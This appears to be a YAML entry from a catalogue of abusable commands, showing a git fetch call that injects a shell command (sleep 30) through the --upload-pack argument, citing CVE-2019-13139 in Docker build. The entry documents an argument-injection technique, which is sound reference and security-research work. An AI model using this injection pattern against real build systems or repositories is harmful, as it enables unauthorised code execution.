---
functions:
  command:
    - code: |-
        git fetch origin '--upload-pack=sleep 30; git@g.com/a/b'
      references:
        - title: "CVE-2019-13139 - Docker build code execution"
          url: https://staaldraad.github.io/post/2019-07-16-cve-2019-13139-docker-build/
---
